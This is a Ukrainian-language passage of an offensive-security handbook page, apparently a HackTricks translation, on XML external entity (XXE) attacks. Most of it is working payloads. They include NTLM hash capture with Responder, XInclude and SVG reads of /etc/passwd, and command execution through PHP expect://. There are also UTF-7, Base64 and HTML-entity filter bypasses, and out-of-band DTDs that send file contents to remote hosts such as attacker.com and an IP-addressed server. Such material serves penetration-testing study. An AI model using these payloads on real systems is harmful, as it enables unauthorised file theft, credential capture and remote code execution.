–ù–∞ —Ö–æ—Å—Ç–∞—Ö Windows –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ö–µ—à NTML –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞, –Ω–∞–ª–∞—à—Ç—É–≤–∞–≤—à–∏ –æ–±—Ä–æ–±–Ω–∏–∫ responder.py:
```bash
Responder.py -I eth0 -v
```
—ñ –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
–¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–∞–º–∞—Ç–∏ —Ö–µ—à –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é hashcat

## –ü—Ä–∏—Ö–æ–≤–∞–Ω—ñ XXE –í–∏—è–≤–ª–µ–Ω–Ω—è

### XInclude

–ü—Ä–∏ —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö –∫–ª—ñ—î–Ω—Ç–∞ –≤ XML-–¥–æ–∫—É–º–µ–Ω—Ç–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞, —Ç–∞–∫—ñ —è–∫ —Ç—ñ, —â–æ –≤ –±–µ–∫–µ–Ω–¥ SOAP –∑–∞–ø–∏—Ç–∞—Ö, –ø—Ä—è–º–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ—é XML —á–∞—Å—Ç–æ –æ–±–º–µ–∂–µ–Ω–∏–π, —â–æ —É—Å–∫–ª–∞–¥–Ω—é—î —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω—ñ –∞—Ç–∞–∫–∏ XXE —á–µ—Ä–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—é –µ–ª–µ–º–µ–Ω—Ç–∞ `DOCTYPE`. –û–¥–Ω–∞–∫ –∞—Ç–∞–∫–∞ `XInclude` –ø—Ä–æ–ø–æ–Ω—É—î —Ä—ñ—à–µ–Ω–Ω—è, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤—Å—Ç–∞–≤–∫—É –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Å—É—Ç–Ω–æ—Å—Ç–µ–π —É –±—É–¥—å-—è–∫–∏–π –µ–ª–µ–º–µ–Ω—Ç –¥–∞–Ω–∏—Ö XML-–¥–æ–∫—É–º–µ–Ω—Ç–∞. –¶–µ–π –º–µ—Ç–æ–¥ —î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º –Ω–∞–≤—ñ—Ç—å —Ç–æ–¥—ñ, –∫–æ–ª–∏ –º–æ–∂–Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –ª–∏—à–µ —á–∞—Å—Ç–∏–Ω—É –¥–∞–Ω–∏—Ö —É –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ–º—É —Å–µ—Ä–≤–µ—Ä–æ–º XML-–¥–æ–∫—É–º–µ–Ω—Ç—ñ.

–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É `XInclude`, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –æ–≥–æ–ª–æ—Å–∏—Ç–∏ –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω `XInclude`, –∞ —Ç–∞–∫–æ–∂ –≤–∫–∞–∑–∞—Ç–∏ —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É –¥–ª—è –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–æ—ó –∑–æ–≤–Ω—ñ—à–Ω—å–æ—ó —Å—É—Ç–Ω–æ—Å—Ç—ñ. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ —Å—Ç–∏—Å–ª–µ –ø—Ä–∏–∫–ª–∞–¥ —Ç–æ–≥–æ, —è–∫ –º–æ–∂–Ω–∞ —Å—Ñ–æ—Ä–º—É–ª—é–≤–∞—Ç–∏ —Ç–∞–∫—É –∞—Ç–∞–∫—É:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

–§–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ –¥–æ –ø–µ–≤–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤, —è–∫—ñ –ø–æ—Ç—ñ–º –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ, –º–æ–∂—É—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ —Ç–æ–º—É, —è–∫ –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è XML –∞–±–æ —Ñ–∞–π–ª–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å XML. –ó–∞–≥–∞–ª—å–Ω—ñ —Ñ–æ—Ä–º–∞—Ç–∏ —Ñ–∞–π–ª—ñ–≤, —Ç–∞–∫—ñ —è–∫ –æ—Ñ—ñ—Å–Ω—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∏ (DOCX) —Ç–∞ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è (SVG), –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ XML.

–ö–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ **–∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**, —Ü—ñ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è –∞–±–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞. –ù–∞–≤—ñ—Ç—å –¥–ª—è –¥–æ–¥–∞—Ç–∫—ñ–≤, —è–∫—ñ –æ—á—ñ–∫—É—é—Ç—å —Ñ–æ—Ä–º–∞—Ç–∏, —Ç–∞–∫—ñ —è–∫ PNG –∞–±–æ JPEG, **–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –æ–±—Ä–æ–±–∫–∏ –∑–æ–±—Ä–∞–∂–µ–Ω—å —Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è SVG**. SVG, –±—É–¥—É—á–∏ —Ñ–æ—Ä–º–∞—Ç–æ–º –Ω–∞ –æ—Å–Ω–æ–≤—ñ XML, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏ –¥–ª—è –ø–æ–¥–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–∏—Ö SVG –∑–æ–±—Ä–∞–∂–µ–Ω—å, —Ç–∏–º —Å–∞–º–∏–º –ø—ñ–¥–¥–∞—é—á–∏ —Å–µ—Ä–≤–µ—Ä –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º XXE (XML External Entity).

–ü—Ä–∏–∫–ª–∞–¥ —Ç–∞–∫–æ–≥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ, –¥–µ —à–∫—ñ–¥–ª–∏–≤–µ SVG –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω—ñ —Ñ–∞–π–ª–∏:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
–Ü–Ω—à–∏–π –º–µ—Ç–æ–¥ –ø–æ–ª—è–≥–∞—î –≤ —Å–ø—Ä–æ–±—ñ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏** —á–µ—Ä–µ–∑ PHP "expect" –æ–±–≥–æ—Ä—Ç–∫—É:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
–£ –æ–±–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö —Ñ–æ—Ä–º–∞—Ç SVG –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–ø—É—Å–∫—É –∞—Ç–∞–∫, —è–∫—ñ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –æ–±—Ä–æ–±–∫–∏ XML –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —Å–µ—Ä–≤–µ—Ä–∞, –ø—ñ–¥–∫—Ä–µ—Å–ª—é—é—á–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –Ω–∞–¥—ñ–π–Ω–æ—ó –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó –≤–≤–µ–¥–µ–Ω–Ω—è —Ç–∞ –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó!

**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ –∑—á–∏—Ç–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É –∞–±–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑'—è–≤–∏—Ç—å—Å—è –í–ù–£–¢–†–Ü —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è. –¢–æ–º—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —è–∫–µ —Å—Ç–≤–æ—Ä–∏–≤ SVG.**

### **PDF - –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É**

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø–æ—Å—Ç, —â–æ–± **–¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ XXE, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ PDF** —Ñ–∞–π–ª:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: –í—ñ–¥ x-www-urlencoded –¥–æ XML

–Ø–∫—â–æ POST-–∑–∞–ø–∏—Ç –ø—Ä–∏–π–º–∞—î –¥–∞–Ω—ñ —É —Ñ–æ—Ä–º–∞—Ç—ñ XML, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ XXE —É —Ü—å–æ–º—É –∑–∞–ø–∏—Ç—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –∑–≤–∏—á–∞–π–Ω–∏–π –∑–∞–ø–∏—Ç –º—ñ—Å—Ç–∏—Ç—å –Ω–∞—Å—Ç—É–ø–Ω–µ:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
–¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç, –∑ —Ç–∏–º –∂–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: –í—ñ–¥ JSON –¥–æ XEE

–©–æ–± –∑–º—ñ–Ω–∏—Ç–∏ –∑–∞–ø–∏—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp –ø—ñ–¥ –Ω–∞–∑–≤–æ—é ‚Äú**Content Type Converter**‚Äú. [–¢—É—Ç](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ü–µ–π –ø—Ä–∏–∫–ª–∞–¥:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
–Ü–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF —Ç–∞ –æ–±—Ö—ñ–¥ –∑–∞—Ö–∏—Å—Ç—ñ–≤

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
–¶–µ –ø—Ä–∞—Ü—é—î –ª–∏—à–µ —è–∫—â–æ XML —Å–µ—Ä–≤–µ—Ä –ø—Ä–∏–π–º–∞—î –ø—Ä–æ—Ç–æ–∫–æ–ª `data://`.

### UTF-7

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ \[**"Encode Recipe**" –∑ cyberchef —Ç—É—Ç ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) –¥–ª—è –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è –≤ UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

–Ø–∫—â–æ –≤–µ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP, –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `file:/` –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **php wrappers**`php://filter/convert.base64-encode/resource=` –¥–ª—è **–¥–æ—Å—Ç—É–ø—É –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —Ñ–∞–π–ª—ñ–≤**.

–Ø–∫—â–æ –≤–µ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î Java, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

–¢—Ä—é–∫ –∑ [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
–í–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å—É—â–Ω—ñ—Å—Ç—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—É—â–Ω–æ—Å—Ç—ñ**, –∑–∞–∫–æ–¥—É–≤–∞–≤—à–∏ —ó—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **html entities**, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —ó—ó –¥–ª—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è dtd**.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **HTML Entities**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è, –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ **—á–∏—Å–ª–æ–≤–∏–º–∏** (—è–∫ \[–≤ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD –ø—Ä–∏–∫–ª–∞–¥:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**–í–∏—Ç—è–≥—Ç–∏** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **–í–∏—Ç—è–≥—Ç–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Ä–µ—Å—É—Ä—Å**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### –í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É

**–Ø–∫—â–æ –º–æ–¥—É–ª—å PHP "expect" –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –Ω–∞—Ç—Ö–Ω–µ–Ω–Ω–∏–π [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–∞—Ü—ñ—ó –æ–±–º—ñ–Ω—É –¥–∞–Ω–∏–º–∏ –≤ –ø—Ä–æ—Ü–µ—Å–∞—Ö –ª–æ–∫–∞–ª—ñ–∑–∞—Ü—ñ—ó. –¶–µ —Ñ–æ—Ä–º–∞—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ XML, —è–∫–∏–π –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –ª–æ–∫–∞–ª—ñ–∑–æ–≤–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö –º—ñ–∂ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ –ø—ñ–¥ —á–∞—Å –ª–æ–∫–∞–ª—ñ–∑–∞—Ü—ñ—ó —Ç–∞ —è–∫ –∑–∞–≥–∞–ª—å–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –æ–±–º—ñ–Ω—É –¥–ª—è CAT (Computer-Aided Translation) —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤.

### Blind Request Analysis

–ó–∞–ø–∏—Ç –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏–º –≤–º—ñ—Å—Ç–æ–º:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
–û–¥–Ω–∞–∫ —Ü–µ–π –∑–∞–ø–∏—Ç –≤–∏–∫–ª–∏–∫–∞—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—é –ø–æ–º–∏–ª–∫—É —Å–µ—Ä–≤–µ—Ä–∞, –∑–æ–∫—Ä–µ–º–∞ –∑–≥–∞–¥—É—é—á–∏ –ø—Ä–æ –ø—Ä–æ–±–ª–µ–º—É –∑ –¥–µ–∫–ª–∞—Ä–∞—Ü—ñ—è–º–∏ —Ä–æ–∑–º—ñ—Ç–∫–∏:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –ø–æ–º–∏–ª–∫—É, –Ω–∞ Burp Collaborator –∑–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω–æ –∑–∞–ø–∏—Ç, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –ø–µ–≤–Ω–∏–π —Ä—ñ–≤–µ–Ω—å –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º –æ–±'—î–∫—Ç–æ–º.

–í–∏—Ç—ñ–∫ –¥–∞–Ω–∏—Ö –ø–æ–∑–∞ –∫–∞–Ω–∞–ª–æ–º –î–ª—è –≤–∏—Ç–æ–∫—É –¥–∞–Ω–∏—Ö –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –º–æ–¥–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
–¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –ø–æ–∫–∞–∑—É—î, —â–æ User Agent –≤–∫–∞–∑—É—î –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Java 1.8. –í—ñ–¥–∑–Ω–∞—á–µ–Ω–æ—é –æ–±–º–µ–∂–µ–Ω–Ω—è–º —Ü—ñ—î—ó –≤–µ—Ä—Å—ñ—ó Java —î –Ω–µ–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ñ–∞–π–ª–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å —Å–∏–º–≤–æ–ª –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, —Ç–∞–∫—ñ —è–∫ /etc/passwd, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–µ—Ö–Ω—ñ–∫—É Out of Band.

